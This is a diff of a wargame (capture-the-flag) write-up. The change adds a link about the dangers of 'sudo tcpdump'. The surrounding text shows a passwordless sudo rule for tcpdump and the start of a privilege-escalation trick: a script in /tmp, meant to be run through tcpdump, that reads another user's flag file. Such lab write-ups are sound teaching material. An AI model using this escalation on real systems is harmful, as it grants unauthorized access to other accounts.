@@ -158,7 +158,7 @@ Matching Defaults entries for level4 on harmonie-technologie:
 User level4 may run the following commands on harmonie-technologie:
     (level4_OK) NOPASSWD: /usr/sbin/tcpdump
 ```
-If we could find a way `tcpdump` to execute a command or a script, it will be done as `level4_OK`. Fortunately for us, we can find this page showing us how to do such a thing. First, we create a script to execute
+If we could find a way `tcpdump` to execute a command or a script, it will be done as `level4_OK`. Fortunately for us, we can find [this](https://www.stevencampbell.info/2016/04/why-sudo-tcpdump-is-dangerous/) page showing us how to do such a thing. First, we create a script to execute
 ```bash
 level4@harmonie-technologie:~$ echo "cat /wargames/level4/validation/flag" > /tmp/script.sh
 level4@harmonie-technologie:~$ chmod +x /tmp/script.sh
